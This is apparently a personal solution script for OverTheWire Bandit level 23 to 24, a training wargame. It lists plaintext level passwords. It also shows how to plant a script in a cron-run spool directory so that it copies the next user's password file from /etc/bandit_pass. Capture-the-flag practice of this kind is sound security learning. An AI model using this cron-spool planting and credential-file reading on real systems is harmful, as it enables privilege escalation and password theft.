#!/usr/bin/env bash

# Autor: Daniel Benjamin Perez Morales
# GitHub: https://github.com/DanielPerezMoralesDev13
# Correo electrónico: danielperezdev@proton.me 

# Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
ssh bandit23@bandit.labs.overthewire.org -p 2220

cd $(mktemp -d)
touch script.sh
chmod o+x script.sh
chmod o+wx ./
ls -ld .
nano script.sh

#!/usr/bin/env bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.2KwDUD75Qy/d4nipwned.txt
exit 0

cp ./script.sh /var/spool/bandit24/foo/script.sh -v

watch -n 1 ls -l

cat d4nipwned.txt

exit

# Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
ssh bandit24@bandit.labs.overthewire.org -p 2220
